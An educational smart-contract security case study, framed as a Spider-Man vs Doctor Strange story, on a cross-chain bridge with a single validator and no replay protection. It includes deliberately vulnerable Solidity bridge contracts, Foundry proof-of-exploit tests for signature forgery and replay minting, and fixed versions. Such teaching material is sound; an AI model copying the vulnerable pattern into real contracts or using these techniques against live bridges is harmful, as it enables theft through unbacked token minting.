# Spider-Man vs Doctor Strange: Multiverse Bridge Heist

## TL;DR
**Vulnerability**: Single-validator systems enable signature forgery, while the absence of replay protection allows attackers to reuse valid messages, minting unbacked tokens. Weak message hashing with `abi.encodePacked` risks collisions.  
**Impact**: The destination chain’s token supply inflates, breaking cross-chain trust and consistency, while source chain funds remain locked.  
**Fix**: Use EIP-712 typed signatures, multi-signature validation, chain-scoped nonces, and decentralized oracles like Chainlink CCIP. Replace `abi.encodePacked` with `abi.encode` to prevent hash collisions.  
**Key Lesson**: A single validator is like one person guarding the multiverse portal-if Strange steals their key, he can forge or replay messages to wreak havoc. Signatures alone are insufficient; use typed messages (EIP-712), chain-scoped nonces, and decentralized relayers for robust security.  
>[!NOTE]
The lack of replay protection in the current implementation allows attackers to mint unlimited tokens, and weak hashing risks collisions. Test for these vulnerabilities and enforce multi-sig or oracle-based solutions.

## 🎬 Story Time: The Multiverse Heist
Spider-Man deposits 1,000 mETH into the **MultiverseBridge** on Ethereum (source chain) to mint tokens on Polygon (destination chain). The bridge locks funds on Ethereum and relies on a single off-chain validator to sign messages for minting on Polygon. Doctor Strange compromises the validator’s key, forging a signature to mint 1,000 unbacked mETH to himself. He also replays a valid message multiple times, exploiting the lack of replay protection. By the time Spider-Man checks his Polygon wallet, the destination chain is flooded with fake mETH, inflating the token supply while source chain reserves remain locked, shattering cross-chain trust.


### All Files Available here.

::github{repo="thesandf/thesandf.xyz"}

## Roles / Actors
| Actor | Role |
|:---|:---|
| **SourceBridge (Source Chain)** | Smart contract on source chain (e.g., Ethereum) for locking assets and emitting events. |
| **DestinationBridge (Destination Chain)** | Smart contract on destination chain (e.g., Polygon) for validating messages and minting tokens. |
| **Spider-Man (User)** | Honest user depositing assets into the bridge. |
| **Doctor Strange (Attacker)** | Compromises validator key to forge signatures and replay messages. |
| **Validator** | Off-chain entity signing cross-chain messages; single point of failure. |
| **ERC20 Token (mETH)** | Mock ERC20 token locked on source and minted on destination. |

>[!NOTE]
Uses mock ERC20 (mETH) for cross-chain transfers, not native ETH. Real bridges wrap ETH as WETH for ERC20 compatibility.

## Vulnerable Code
Three contracts simulate cross-chain bridging: `SourceBridge.sol` locks funds on the source chain, `DestinationBridge.sol` mints tokens on the destination chain via signed messages, and `MockMintableERC20.sol` implements the mETH token.

### IMintableToken.sol
```solidity
// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

// Interface for mintable token
interface IMintableToken {
    function mint(address to, uint256 amount) external;
}
```

### MockMintableERC20.sol
```solidity collapse={9-57}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./IMintableToken.sol";

// Mock ERC20 for simulation (mETH)
contract MockMintableERC20 is IERC20, IMintableToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external override {
        balances[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        require(allowances[from][msg.sender] >= amount, "ERC20: allowance exceeded");
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances[owner][spender];
    }
}
```

### SourceBridge.sol
```solidity
// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Source Bridge ( Ethereum)
contract SourceBridge {
    address public bridgedToken;
    uint256 public totalLocked = 0;
    mapping(address => uint256) public userLockedFunds;

    event FundsLocked(address indexed user, uint256 amount, uint256 nonce, bytes32 txHash);

    constructor(address _token) {
        bridgedToken = _token;
    }

    function lockFunds(uint256 amount, uint256 nonce) external {
        IERC20(bridgedToken).transferFrom(msg.sender, address(this), amount);
        userLockedFunds[msg.sender] += amount;
        totalLocked += amount;
        bytes32 txHash = keccak256(abi.encode(blockhash(block.number - 1), msg.sender, amount, nonce));
        emit FundsLocked(msg.sender, amount, nonce, txHash);
    }
}
```

### DestinationBridge.sol
```solidity
// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol"; 
import "./IMintableToken.sol";

// Destination Bridge (Polygon) - Vulnerable
contract DestinationBridge {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    address public validator;
    address public bridgedToken;

    constructor(address _validator, address _token) {
        validator = _validator;
        bridgedToken = _token;
    }

    function withdraw(address to, uint256 amount, uint256 nonce, bytes32 sourceTxHash, bytes memory signature) external {
        bytes32 messageHash = keccak256(abi.encodePacked(to, amount, nonce, sourceTxHash));
        bytes32 ethSignedMessageHash = messageHash.toEthSignedMessageHash();
        address signer = ethSignedMessageHash.recover(signature);
        require(signer == validator, "Invalid signature");

        IMintableToken(bridgedToken).mint(to, amount);
    }
}
```

**Vulnerabilities**:
1. **Single Validator**: A compromised validator key allows forging any message, enabling unauthorized minting.
2. **Replay Attack**: No `processedMessages` mapping or nonce validation allows reusing valid signatures to mint unlimited tokens.
3. **Message Hash Collisions**: Using `abi.encodePacked` risks collisions (e.g., `("1","23")` vs `("12","3")`), potentially allowing unintended message validation.
4. **No User Fund Check**: The contract does not verify that funds were locked on the source chain, risking minting without backing.
5. **Mempool Race Potential**: Although no explicit replay protection exists, parallel transactions could exacerbate issues in a production environment without sequencing.

**OpenZeppelin v5.0.0 Notes**:
- The contract uses `MessageHashUtils.toEthSignedMessageHash` for Ethereum signed message prefixing, as OpenZeppelin v5.0.0 separates hashing utilities from `ECDSA.sol` into `MessageHashUtils.sol` for better modularity.
- `ECDSA.sol` handles signature recovery (`recover`, `tryRecover`), while `MessageHashUtils.sol` manages message hashing, aligning with modern Solidity design practices.

## Attack Steps
1. **Spider-Man Locks on Source**: Deposits 1,000 mETH into `SourceBridge`, emitting `FundsLocked` with nonce and `txHash`.
2. **Validator Signs**: Off-chain validator signs a message for destination withdrawal.
3. **Strange Compromises Validator**: Steals the validator’s private key, forging a message to mint 1,000 mETH to himself.
4. **Replay Attack**: Reuses a valid signed message (e.g., Spider-Man’s withdrawal) multiple times, minting additional mETH without restrictions.
5. **Outcome**: The destination chain mints unbacked mETH (e.g., 2,000+ mETH for a 1,000 mETH lock), inflating supply and breaking cross-chain consistency.

## Attack Flow: Visualized
This Mermaid flowchart illustrates Doctor Strange’s signature forgery and replay exploit:

![replay Exploit Flow](/Replay-Bridge.svg)

## Proof of Exploit: Foundry Test
The following tests demonstrate the signature forgery and replay vulnerabilities using Foundry.

```solidity {"1":40} {"2":57} {"3":61} {"1":71} {"2":88} {"3":92} {"4":97}
// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "../src/SourceBridge.sol";
import "../src/DestinationBridge.sol";
import "../src/MockMintableERC20.sol";

contract DoctorStrangeCrossChainExploit is Test {
    SourceBridge sourceBridge;
    DestinationBridge destBridge;
    MockMintableERC20 mockToken;
    address spiderMan = makeAddr("SpiderMan");
    address doctorStrange = makeAddr("DoctorStrange");
    uint256 validatorPk = 0xBEEF; // Real private key
    address validator;
    bytes32 bridgeId = keccak256("MultiverseBridge");

    function setUp() public {
        validator = vm.addr(validatorPk); // Derive address from PK
        mockToken = new MockMintableERC20("mETH", "mETH");
        sourceBridge = new SourceBridge(address(mockToken));
        destBridge = new DestinationBridge(validator, address(mockToken));

        // Fund Spider-Man
        mockToken.mint(spiderMan, 1000);
        
        // Verify Spider-Man's balance
        assertEq(mockToken.balanceOf(spiderMan), 1000, "Spider-Man should have 1000 mETH");
    }

    function signMessage(bytes32 messageHash, uint256 pk) internal pure returns (bytes memory) {
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethSignedMessageHash);
        return abi.encodePacked(r, s, v);
    }

    function testSignatureForgery() public {
        // Step 1: Spider-Man approves and locks 1,000 mETH
        vm.startPrank(spiderMan);
        mockToken.approve(address(sourceBridge), 1000);
        
        // Verify allowance
        assertEq(mockToken.allowance(spiderMan, address(sourceBridge)), 1000, "SourceBridge should have 1000 mETH allowance");
        
        sourceBridge.lockFunds(1000, 1);
        vm.stopPrank();

        // Verify lock
        assertEq(sourceBridge.totalLocked(), 1000, "SourceBridge should have 1000 mETH locked");
        assertEq(mockToken.balanceOf(address(sourceBridge)), 1000, "SourceBridge should hold 1000 mETH");

        // Simulate event data
        bytes32 sourceTxHash = keccak256(abi.encode(blockhash(block.number - 1), spiderMan, 1000, uint256(1)));

        // Step 2: Forge signature (attacker has validator key)
        bytes32 messageHash = keccak256(abi.encodePacked(doctorStrange, uint256(1000), uint256(1), sourceTxHash));
        bytes memory forgedSig = signMessage(messageHash, validatorPk);

        // Step 3: Attacker mints on destination
        vm.prank(doctorStrange);
        destBridge.withdraw(doctorStrange, 1000, 1, sourceTxHash, forgedSig);

        // Verify: Attacker got unbacked funds
        assertEq(mockToken.balanceOf(doctorStrange), 1000, "Forgery failed");
        assertEq(sourceBridge.totalLocked(), 1000, "Source drained unexpectedly");
    }

    function testReplayAttack() public {
        // Step 1: Spider-Man approves and locks 1,000 mETH
        vm.startPrank(spiderMan);
        mockToken.approve(address(sourceBridge), 1000);
        
        // Verify allowance
        assertEq(mockToken.allowance(spiderMan, address(sourceBridge)), 1000, "SourceBridge should have 1000 mETH allowance");
        
        sourceBridge.lockFunds(1000, 1);
        vm.stopPrank();

        // Verify lock
        assertEq(sourceBridge.totalLocked(), 1000, "SourceBridge should have 1000 mETH locked");
        assertEq(mockToken.balanceOf(address(sourceBridge)), 1000, "SourceBridge should hold 1000 mETH");

        // Simulate event data
        bytes32 sourceTxHash = keccak256(abi.encode(blockhash(block.number - 1), spiderMan, 1000, uint256(1)));

        // Step 2: Create valid signature
        bytes32 messageHash = keccak256(abi.encodePacked(spiderMan, uint256(1000), uint256(1), sourceTxHash));
        bytes memory validSig = signMessage(messageHash, validatorPk);

        // Step 3: Legitimate withdraw
        vm.prank(spiderMan);
        destBridge.withdraw(spiderMan, 1000, 1, sourceTxHash, validSig);
        assertEq(mockToken.balanceOf(spiderMan), 1000, "Legit withdraw failed");

        // Step 4: Replay attack with same parameters
        vm.prank(doctorStrange);
        destBridge.withdraw(spiderMan, 1000, 1, sourceTxHash, validSig); // Use spiderMan as 'to' address

        // Verify: Attacker successfully replayed and minted extra tokens
        assertEq(mockToken.balanceOf(spiderMan), 2000, "Replay attack failed to mint extra tokens");
    }
}
```

**Test Notes**:
- `testSignatureForgery`: Demonstrates that a compromised validator key allows Doctor Strange to forge a signature and mint 1,000 unbacked mETH to himself.
- `testReplayAttack`: Shows that the lack of replay protection allows Doctor Strange to reuse a valid signed message, minting an additional 1,000 mETH, inflating the destination chain’s supply to 2,000 mETH for only 1,000 mETH locked.

## Fixes: Securing the MultiverseBridge
To address the vulnerabilities, implement robust message signing, replay protection, and decentralized messaging.

### Fix 1: Robust Message Signing and Multi-Signature Validators
Use EIP-712 typed hashing, chain-scoped nonces, multi-signature validation, and replay protection.

```solidity
// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "./IMintableToken.sol";

contract DestinationBridgeSecure is Ownable {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    address[] public validators;
    uint256 public requiredSignatures;
    mapping(bytes32 => bool) public processedMessages;
    address public bridgedToken;
    bytes32 public bridgeId;

    constructor(address[] memory _validators, uint256 _requiredSignatures, address _token, bytes32 _bridgeId) Ownable(msg.sender) {
        require(_validators.length > 0 && _requiredSignatures > 0 && _requiredSignatures <= _validators.length, "Invalid setup");
        validators = _validators;
        requiredSignatures = _requiredSignatures;
        bridgedToken = _token;
        bridgeId = _bridgeId;
    }

    function buildMessageHash(
        address to, uint256 amount, uint256 nonce, bytes32 sourceTxHash, uint256 sourceChainId, uint256 destinationChainId
    ) public view returns (bytes32) {
        return keccak256(abi.encode(
            keccak256("BridgeMessage(address to,uint256 amount,uint256 nonce,bytes32 sourceTxHash,uint256 sourceChainId,uint256 destinationChainId,bytes32 bridgeId)"),
            to, amount, nonce, sourceTxHash, sourceChainId, destinationChainId, bridgeId
        ));
    }

    function withdraw(address to, uint256 amount, uint256 nonce, bytes32 sourceTxHash, uint256 sourceChainId, bytes[] calldata signatures) external {
        bytes32 messageHash = buildMessageHash(to, amount, nonce, sourceTxHash, sourceChainId, block.chainid);
        require(!processedMessages[messageHash], "Message already processed");

        uint256 validSigs = 0;
        address[] memory seen = new address[](signatures.length);
        for (uint256 i = 0; i < signatures.length; i++) {
            address signer = messageHash.toEthSignedMessageHash().recover(signatures[i]);
            require(isValidator(signer), "Not a validator");
            for (uint256 j = 0; j < i; j++) { require(seen[j] != signer, "Duplicate signature"); }
            seen[i] = signer;
            validSigs++;
        }
        require(validSigs >= requiredSignatures, "Insufficient signatures");

        processedMessages[messageHash] = true;
        IMintableToken(bridgedToken).mint(to, amount);
    }

    function isValidator(address _address) public view returns (bool) {
        for (uint256 i = 0; i < validators.length; i++) {
            if (validators[i] == _address) return true;
        }
        return false;
    }
}
```

**Benefits**:
- **EIP-712 Hashing**: Using `abi.encode` with a typed structure (including chain IDs and `bridgeId`) prevents hash collisions and cross-chain replays.
- **Multi-Signature Validation**: Requires multiple validators to sign, reducing single-point-of-failure risks.
- **Replay Protection**: The `processedMessages` mapping ensures messages are only processed once.
- **OpenZeppelin v5.0.0 Compatibility**: Uses `MessageHashUtils.toEthSignedMessageHash` for secure message hashing.

### Fix 2: Chainlink CCIP
Use Chainlink’s Cross-Chain Interoperability Protocol (CCIP) for decentralized messaging.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IRouterClient } from "@chainlink/contracts-ccip/src/v0.8/ccip/interfaces/IRouterClient.sol";
import { IAny2EVMMessageReceiver } from "@chainlink/contracts-ccip/src/v0.8/ccip/interfaces/IAny2EVMMessageReceiver.sol";
import { Client } from "@chainlink/contracts-ccip/src/v0.8/ccip/libraries/Client.sol";
import "./IMintableToken.sol";

// Source Bridge contract (sends message and locks funds)
contract BridgeSourceCCIP {
    IRouterClient public ccipRouter;
    IERC20 public bridgedToken;
    uint64 public destinationChainSelector;

    constructor(address _ccipRouter, address _token, uint64 _destinationChainSelector) {
        ccipRouter = IRouterClient(_ccipRouter);
        bridgedToken = IERC20(_token);
        destinationChainSelector = _destinationChainSelector;
    }

    function lockFundsAndSendMessage(address receiver, uint256 amount) external returns (bytes32) {
        bridgedToken.transferFrom(msg.sender, address(this), amount);
        Client.EVM2AnyMessage memory message = Client.EVM2AnyMessage({
            receiver: abi.encode(receiver),
            data: abi.encode(amount),
            tokenAmounts: new Client.EVMTokenAmount[](0),
            extraArgs: "",
            feeToken: address(0)
        });
        bytes32 messageId = ccipRouter.ccipSend(destinationChainSelector, message);
        return messageId;
    }
}

// Destination Bridge contract (receives message and mints)
contract BridgeDestinationCCIP is IAny2EVMMessageReceiver {
    IRouterClient public ccipRouter;
    IMintableToken public mintableToken;

    constructor(address _ccipRouter, address _mintableToken) {
        ccipRouter = IRouterClient(_ccipRouter);
        mintableToken = IMintableToken(_mintableToken);
    }

    // Receiving CCIP message (the function must be public or external according to latest CCIP standards)
    function ccipReceive(Client.Any2EVMMessage calldata message) external override {
        require(msg.sender == address(ccipRouter), "Unauthorized CCIP router");
        (address receiver) = abi.decode(message.receiver, (address));
        (uint256 amount) = abi.decode(message.data, (uint256));
        mintableToken.mint(receiver, amount);
    }
}
```

**Benefits**:
- **Decentralized Trust**: Leverages Chainlink’s Decentralized Oracle Network (DON) for message validation, eliminating validator key risks.
- **Replay and Ordering Protection**: CCIP ensures messages are processed once and in order.
- **Simplified Logic**: Removes reliance on manual signature verification.

## Concrete Issues & Fixes
1. **Weak Message Hashing**:
   - **Issue**: `abi.encodePacked` in `DestinationBridge.withdraw` risks collisions due to ambiguous concatenation.
   - **Fix**: Use `abi.encode` with EIP-712-like structure, including `sourceChainId`, `destinationChainId`, and `bridgeId` (see `DestinationBridgeSecure.buildMessageHash`).
2. **Replay Attacks**:
   - **Issue**: No `processedMessages` mapping allows unlimited reuse of valid signatures.
   - **Fix**: Reintroduce `processedMessages` and mark messages before minting; include chain-specific nonces and chain IDs in the hash.
3. **Single Validator**:
   - **Issue**: A single compromised key enables forgery.
   - **Fix**: Implement multi-signature validation requiring multiple unique signers (see `DestinationBridgeSecure`).
4. **Mempool Races**:
   - **Issue**: Although not directly tested, parallel transactions could exploit race conditions in a production environment.
   - **Fix**: Use a sequencer, Chainlink CCIP, or on-chain relays with staking/penalties for message ordering.
5. **No Fund Verification**:
   - **Issue**: No check ensures funds are locked on the source chain.
   - **Fix**: Use on-chain proofs (e.g., Merkle proofs) or cross-chain queries to verify source chain state.

## Upgradability and Governance Risks
- **Proxy Bugs**: Errors in proxy logic (e.g., UUPS) or admin misuse could allow unauthorized upgrades or fund drainage.
- **Governance**: Use 48-hour timelocks for upgrades to enable community review and prevent malicious changes.
- **Recommendation**: Audit proxy contracts using OpenZeppelin Upgrades plugins and test upgrade paths thoroughly.

## Real-World Context 
Cross-chain bridges have lost over $3.2 billion since 2021, with DeFi hacks continuing to escalate amid growing interoperability demands. This case mirrors real-world exploits, including recent incidents highlighting persistent risks in validator security, private key management, and smart contract flaws:

| Hack | Vulnerability | Loss | Lesson |
|------|---------------|------|--------|
| **Wormhole (2022)** | Smart contract flaw enabling signature forgery | $320M | Rigorous code audits and multi-sig validation for message integrity |
| **Ronin (2022)** | Validator key theft via social engineering | $625M | Decentralized validator networks and secure key management practices |
| **Multichain (2023)** | Compromised private keys controlled by CEO | $126M | Eliminate single points of failure with multi-sig and audited custodian systems |
| **Orbit Chain (2024)** | Multisig private key compromise (7/10 keys) | $81M | Robust multisig thresholds and decentralized oracles like Chainlink CCIP |
| **MultiverseBridge (Fictional)** | Single validator & no replay protection | 2,000+ mETH minted | Implement EIP-712 hashing, chain-scoped nonces, and multi-sig for replay and forgery prevention

## Auditor’s Checklist
- [ ] **Signature Validation**: Require multiple unique signers for validation.
- [ ] **Replay Protection**: Use `processedMessages`, chain-specific nonces, and EIP-712 hashing.
- [ ] **Race Conditions**: Implement sequencers or CCIP for ordered message processing.
- [ ] **Cross-Chain Consistency**: Verify source chain funds via proofs or oracles.
- [ ] **Message Integrity**: Use `abi.encode` with chain IDs and bridge ID to prevent collisions.
- [ ] **Timelocks**: Add delays for high-value actions or upgrades.
- [ ] **Upgradability**: Audit proxies for admin vulnerabilities.
- [ ] **Economic Defenses**: Implement validator slashing or bonding for accountability.

---

## Challenge: Seal the Multiverse Portal!

**Challenge Name**: Spider-Man’s Multiverse Defense Mission  
**Description**: Outsmart Doctor Strange like Spider-Man and secure the MultiverseBridge from his signature forgery and replay attacks!

1. Deploy `SourceBridge.sol`, `DestinationBridge.sol`, and `MockMintableERC20.sol` on Sepolia and Mumbai testnets to simulate a cross-chain bridge (use Foundry or Remix).  
2. Execute the signature forgery and replay attacks using the provided Foundry test (`DoctorStrangeCrossChainExploit.t.sol`) to see Doctor Strange mint unbacked mETH.  
3. Implement a fix by deploying `DestinationBridgeSecure.sol` (with multi-signature and EIP-712) or integrate Chainlink CCIP for decentralized messaging.  
4. Re-run the tests to confirm that forgery and replay attacks fail, ensuring the bridge’s security.  
5. Submit your fix to the Discussions tab, and share your Sepolia/Mumbai contract addresses on X with `#TheSandFChallenge` and tag `@THE_SANDF`.  
**Bonus**: Post a screenshot of your transaction logs showing the failed replay attack or successful CCIP message!  
**Reward**: Top submissions earn a chance to join our audit beta program and a shoutout from Spider-Man himself!

## Three Quiz Questions to Test Understanding

1.**What makes the `DestinationBridge.sol` contract vulnerable to a replay attack?**

a) Lack of access control in the `withdraw` function  
b) Absence of the `processedMessages` mapping to track used messages  
c) Incorrect signature recovery using `ECDSA.recover`  
d) Missing chain ID in the message hash  

   <details>
   <summary>Show Answer</summary>
   
   **Answer**: b) Absence of the `processedMessages` mapping to track used messages  
     **Explanation**: The `DestinationBridge.sol` contract lacks the `processedMessages` mapping, which would prevent reusing a valid signed message. This allows Doctor Strange to replay Spider-Man’s legitimate withdrawal message multiple times, minting additional unbacked mETH on the destination chain. The test `testReplayAttack` confirms this by successfully minting 2,000 mETH (1,000 from the legitimate withdrawal + 1,000 from the replay) for only 1,000 mETH locked on the source chain.
   </details>   

2.**Why does the use of `abi.encodePacked` in `DestinationBridge.withdraw` pose a security risk?**

a) It prevents signature validation with `MessageHashUtils`  
b) It risks hash collisions due to ambiguous concatenation  
c) It exposes the validator’s private key in the mempool  
d) It lacks support for chain-specific nonces 

   <details>
   <summary>Show Answer</summary>

   **Answer**: b) It risks hash collisions due to ambiguous concatenation  
     **Explanation**: Using `abi.encodePacked` in `DestinationBridge.withdraw` to create the `messageHash` can lead to hash collisions (e.g., `("1","23")` vs. `("12","3")` producing the same hash). This could allow an attacker to craft a different message that validates with the same signature, potentially minting unauthorized tokens. The case study recommends using `abi.encode` with an EIP-712-like structure (as in `DestinationBridgeSecure`) to ensure unique and unambiguous hashes.
   </details>

3.**How does the single-validator design in `DestinationBridge.sol` enable signature forgery?** 

a) It allows multiple signatures to bypass validation  
b) A compromised validator key can sign arbitrary messages  
c) It lacks chain ID verification in the signature  
d) It uses an outdated version of OpenZeppelin’s ECDSA library  

   <details>
   <summary>Show Answer</summary>

   **Answer**: b) A compromised validator key can sign arbitrary messages  
    **Explanation**: The `DestinationBridge.sol` contract relies on a single validator to sign withdrawal messages. If Doctor Strange compromises the validator’s private key (as simulated in `testSignatureForgery`), he can forge signatures for any message, minting unbacked mETH to any address. The test demonstrates this by allowing Doctor Strange to mint 1,000 mETH to himself. The case study proposes multi-signature validation (e.g., `DestinationBridgeSecure`) to mitigate this by requiring multiple validators to sign.
   </details>
---

## Ready to Battle Bugs? 

**Join** the **Defi CTF Challenge!** Audit vulnerable contracts in our Defi CTF Challenges (Full credit to [Hans Friese](https://x.com/hansfriese), co-founder of [Cyfrin](https://cyfrin.com).), submit your report via GitHub Issues/Discussions, or tag @THE_SANDF on X. Let’s secure the Web3 multiverse together!  🏗️ [Start the Challenge](/posts/ctf-solutions/defi-ctf-challenges/)


### All Files Available here.

::github{repo="thesandf/thesandf.xyz"}


